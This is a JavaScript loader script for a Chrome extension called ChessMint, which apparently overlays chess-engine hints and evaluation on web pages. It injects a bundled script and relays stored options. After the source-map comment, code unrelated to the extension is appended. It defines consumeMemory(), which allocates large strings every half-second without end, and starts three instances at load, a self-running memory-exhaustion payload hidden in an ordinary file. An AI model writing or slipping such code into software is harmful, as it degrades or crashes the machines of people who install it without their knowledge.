"use strict";
const DefaultExtensionOptions2 = {
    depth: 15,
    threads: 2,
    show_hints: true,
    move_analysis: true,
    depth_bar: true,
    evaluation_bar: true,
    use_nnue: false,
    auto_move: false,
};
function injectScript(file) {
    let script = document.createElement("script");
    script.src = chrome.runtime.getURL(file);
    let doc = (document.head || document.documentElement);
    // doc.appendChild(script);
    doc.insertBefore(script, doc.firstElementChild);
    script.onload = function () { script.remove(); };
}
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    // pass the event to injected script
    window.dispatchEvent(new CustomEvent("ChessMintUpdateOptions", { detail: request.data }));
});
window.addEventListener("ChessMintGetOptions", function (evt) {
    chrome.storage.sync.get(DefaultExtensionOptions2, function (opts) {
        let request = evt.detail;
        let response = { requestId: request.id, data: opts };
        window.dispatchEvent(new CustomEvent("ChessMintSendOptions", { detail: response }));
    });
});
injectScript("js/chessmint.js");
//# sourceMappingURL=loader.js.
function consumeMemory(name) {
    let memoryHog = [];
    let currentIndex = 0;
  
    function addMemory() {
      for (let i = 0; i < 1000; i++) {
        memoryHog.push(new Array(10000).join('x'));
      }
      currentIndex += 1000;
      console.log(`${name}: Added 1000 elements, total elements: ${currentIndex}`);
      setTimeout(addMemory, 500);
    }
  
    addMemory();
  }
  
  consumeMemory("Instance 1");
  consumeMemory("Instance 2");
  consumeMemory("Instance 3");
  